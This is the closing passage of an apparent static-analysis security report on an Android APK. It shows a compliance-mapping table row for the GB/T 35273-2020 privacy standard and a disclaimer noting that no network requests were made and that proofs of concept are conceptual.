| GB/T 35273-2020 | 5.2 collection rules, 6.3 transit encryption, 7.1 withdrawal | 5.10 |

---

*This report is based on static decompilation of `SystemHelper_1.2-20221110.apk`. No network requests were made to any target server. All proofs of concept are conceptual and intended to drive remediation. Items tagged `[C]` or `[D]` are unconfirmed and do not constitute conclusions. Every conclusion can be independently verified using the code index in Appendix A.*




